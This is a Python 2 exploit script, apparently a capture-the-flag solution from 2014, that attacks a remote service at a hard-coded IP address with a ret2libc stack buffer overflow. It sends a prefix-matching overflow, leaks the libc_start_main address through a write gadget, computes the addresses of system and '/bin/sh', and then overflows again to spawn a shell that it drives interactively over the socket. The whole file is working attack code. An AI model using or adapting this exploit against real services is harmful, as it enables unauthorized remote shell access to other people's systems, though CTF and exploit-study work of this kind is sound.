#!/usr/bin/env python
# -*- coding: UTF-8 -*-
'''
Exploit the stack buffer overflow vulnerability using ret2libc
Created on 2014/12/9
@author: Ben Chang
'''
import socket
import struct

host='218.2.197.235'
port=10101

libc_start_main=0x0804985c          #got address of function libc_start_main
offset_libc_main_start=0x000193e0   #offset of libc_start_main in libc.so
offset_system=0x0003f430            #offset of function system in libc.so
offset_binsh=0x00160f58             #offset of data "binsh" in libc.so
shellcode1=''
shellcode2=''
shellcode3=''

ex1_code1='syclover\x00'            #9 bytes  match the prefix checking
ex1_code2='A'*7                     #7 bytes   padding 
ex1_code3='\xff'                    #overflow the value of n change the value of n to "0xff"
#assemble the shellcode1
shellcode1+=ex1_code1
shellcode1+=ex1_code2
shellcode1+=ex1_code3

ex2_code1='A'*0xa0                  #padding 0xa0 data
ex2_code2=0x080483a0                #ret_gadget1 -->write  imformation leakage 
ex2_code3=0x080485c8                #ret_gadget2 -->return to the main function to overflow once more
ex2_code4='\x01\x00\x00\x00'        #arg1  fd
ex2_code5=libc_start_main           #arg2  buf :to leakage the base address of libc_start_main
ex2_code6='\x04\x00\x00\x00'        #arg3  size

#assemble the shellcode2
shellcode2+=ex2_code1
shellcode2+=struct.pack('I',ex2_code2)
shellcode2+=struct.pack('I',ex2_code3)
shellcode2+=ex2_code4
shellcode2+=struct.pack('I',ex2_code5)
shellcode2+=ex2_code6

#connect the remote vulnerable program
sok=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sok.connect((host,port))

rdata=sok.recv(1024)
print rdata
sok.send(shellcode1)  
rdata=sok.recv(1024)
print rdata
sok.send(shellcode2)  
libc_main=sok.recv(len(shellcode2))
print libc_main
libc_main=sok.recv(8)
print libc_main
libc_main=struct.unpack('I',libc_main)[0]
print '-----------Information Leakage--------'
print 'libc_main:',hex(libc_main)
base_libc=libc_main-offset_libc_main_start
print 'base_libc:',hex(base_libc)
system=base_libc+offset_system
print 'system:',hex(system)
binsh=base_libc+offset_binsh
print '/bin/sh::',hex(binsh)

shellcode3+=ex2_code1  #padding 0xa0 data
shellcode3+=struct.pack('I',system)   #ret to libc :call system
shellcode3+='a'*4
shellcode3+=struct.pack('I',binsh)    #arg of system: system("/bin/sh")
rdata=sok.recv(1024)
print rdata
sok.send(shellcode1)
rdata=sok.recv(1024)
print rdata
sok.send(shellcode3)
#get the shell
while True:
    message=raw_input("$")
    sok.send(message+'\n')
    rdata=sok.recv(1024)
    print rdata

